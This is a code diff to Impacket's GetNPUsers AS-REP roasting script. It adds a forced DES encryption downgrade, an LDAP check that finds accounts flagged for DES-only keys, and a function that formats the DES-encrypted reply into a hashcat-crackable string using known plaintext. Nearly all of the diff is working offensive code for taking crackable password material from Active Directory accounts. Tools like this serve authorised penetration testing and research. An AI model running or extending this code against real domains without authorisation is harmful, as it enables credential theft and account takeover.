@@ -39,7 +39,7 @@ from pyasn1.codec.der import decoder, encoder
 from pyasn1.type.univ import noValue
 
 from impacket import version
-from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
+from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH, UF_USE_DES_KEY_ONLY
 from impacket.examples import logger
 from impacket.examples.utils import parse_identity, ldap_login
 from impacket.krb5 import constants
@@ -84,6 +84,7 @@ class GetUserNoPreAuth:
         #[!] in this script the value of -dc-ip option is self.__kdcIP and the value of -dc-host option is self.__kdcHost
         self.__kdcIP = cmdLineOptions.dc_ip
         self.__kdcHost = cmdLineOptions.dc_host
+        self.__useDES = cmdLineOptions.force_des
         if cmdLineOptions.hashes is not None:
             self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
 
@@ -101,7 +102,25 @@ class GetUserNoPreAuth:
         t /= 10000000
         return t
 
-    def getTGT(self, userName, requestPAC=True):
+    def formDESHash(self, stCipherHex, domain):
+        """
+        Form DES hash for hashcat cracking format
+        Based on Rubeus implementation
+        """
+        # Calculate known plaintext based on domain length
+        wholeLength = 193 + (len(domain) * 2)
+        knownPlain = bytes([0x79, 0x81, wholeLength & 0xFF, 0x30, 0x81, (wholeLength - 3) & 0xFF, 0xA0, 0x13])
+        
+        # Extract IV and first block from cipher hex
+        IV = bytes.fromhex(stCipherHex[32:48])  # 16 hex chars = 8 bytes
+        firstBlock = bytes.fromhex(stCipherHex[48:64])  # 16 hex chars = 8 bytes
+        
+        # XOR IV with known plaintext
+        xoredIV = bytes(knownPlain[i] ^ IV[i] for i in range(8))
+        
+        return f"{firstBlock.hex()}:{xoredIV.hex()}"
+
+    def getTGT(self, userName, requestPAC=True, useDES=False):
 
         clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
@@ -143,7 +162,10 @@ class GetUserNoPreAuth:
         reqBody['rtime'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.getrandbits(31)
 
-        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
+        if useDES:
+            supportedCiphers = (int(constants.EncryptionTypes.des_cbc_md5.value),)
+        else:
+            supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
 
         seq_set_iter(reqBody, 'etype', supportedCiphers)
 
@@ -175,6 +197,9 @@ class GetUserNoPreAuth:
 
         # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
         if self.__outputFormat == 'john':
+            # Check if DES - not supported in John format
+            if asRep['enc-part']['etype'] == 3:  # DES
+                raise Exception('DES not supported for john format, please rerun with --format hashcat')
             # Check what type of encryption is used for the enc-part data
             # This will inform how the hash output needs to be formatted
             if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
@@ -190,7 +215,9 @@ class GetUserNoPreAuth:
         else:
             # Check what type of encryption is used for the enc-part data
             # This will inform how the hash output needs to be formatted
-            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
+            if asRep['enc-part']['etype'] == 3:  # DES
+                return self.formDESHash(hexlify(asRep['enc-part']['cipher'].asOctets()).decode(), domain)
+            elif asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
                 return '$krb5asrep$%d$%s$%s$%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode(),
                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode())
@@ -214,7 +241,7 @@ class GetUserNoPreAuth:
         if self.__doKerberos is False and self.__no_pass is True:
             # Yes, just ask the TGT and exit
             logging.info('Getting TGT for %s' % self.__username)
-            entry = self.getTGT(self.__username)
+            entry = self.getTGT(self.__username, useDES=self.__useDES)
             self.outputTGT(entry, None)
             return
 
@@ -227,7 +254,7 @@ class GetUserNoPreAuth:
             if str(e).find('strongerAuthRequired') < 0:
                 # Cannot authenticate, we will try to get this users' TGT (hoping it has PreAuth disabled)
                 logging.info('Cannot authenticate %s, getting its TGT' % self.__username)
-                entry = self.getTGT(self.__username)
+                entry = self.getTGT(self.__username, useDES=self.__useDES)
                 self.outputTGT(entry, None)
                 return
 
@@ -271,13 +298,19 @@ class GetUserNoPreAuth:
             pwdLastSet = ''
             userAccountControl = 0
             lastLogon = 'N/A'
+            supportsDES = False
             try:
                 for attribute in item['attributes']:
                     if str(attribute['type']) == 'sAMAccountName':
                         sAMAccountName = str(attribute['vals'][0])
                         mustCommit = True
                     elif str(attribute['type']) == 'userAccountControl':
-                        userAccountControl = "0x%x" % int(attribute['vals'][0])
+                        uacValue = int(attribute['vals'][0])
+                        userAccountControl = "0x%x" % uacValue
+                        # Check if user supports DES
+                        if (uacValue & UF_USE_DES_KEY_ONLY) != 0:
+                            supportsDES = True
+                            logging.info('User %s supports DES!' % sAMAccountName)
                     elif str(attribute['type']) == 'memberOf':
                         memberOf = str(attribute['vals'][0])
                     elif str(attribute['type']) == 'pwdLastSet':
@@ -291,7 +324,9 @@ class GetUserNoPreAuth:
                         else:
                             lastLogon = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                 if mustCommit is True:
-                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
+                    # Use DES if user supports it OR if force-des is enabled
+                    useDES = supportsDES or self.__useDES
+                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl, useDES])
             except Exception as e:
                 logging.debug("Exception:", exc_info=True)
                 logging.error('Skipping item, cannot process due to error %s' % str(e))
@@ -302,8 +337,9 @@ class GetUserNoPreAuth:
             print('\n\n')
 
             if self.__requestTGT is True:
-                usernames = [answer[0] for answer in answers]
-                self.request_multiple_TGTs(usernames)
+                # Create list of tuples (username, supportsDES)
+                user_info = [(answer[0], answer[5]) for answer in answers]
+                self.request_multiple_TGTs(user_info)
 
         else:
             print("No entries found!")
@@ -312,16 +348,18 @@ class GetUserNoPreAuth:
         with open(self.__usersFile) as fi:
             usernames = [line.strip() for line in fi]
 
-        self.request_multiple_TGTs(usernames)
+        # For file-based users, use force-des flag since we can't query LDAP
+        user_info = [(username, self.__useDES) for username in usernames]
+        self.request_multiple_TGTs(user_info)
 
-    def request_multiple_TGTs(self, usernames):
+    def request_multiple_TGTs(self, user_info):
         if self.__outputFileName is not None:
             fd = open(self.__outputFileName, 'w+')
         else:
             fd = None
-        for username in usernames:
+        for username, supportsDES in user_info:
             try:
-                entry = self.getTGT(username)
+                entry = self.getTGT(username, useDES=supportsDES)
                 self.outputTGT(entry, fd)
             except Exception as e:
                 logging.error('%s' % str(e))
@@ -347,6 +385,8 @@ if __name__ == '__main__':
                         help='format to save the AS_REQ of users without pre-authentication. Default is hashcat')
 
     parser.add_argument('-usersfile', help='File with user per line to test')
+    parser.add_argument('-force-des', action='store_true', default=False, help='Force DES encryption for all users (useful for testing)')
+
 
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
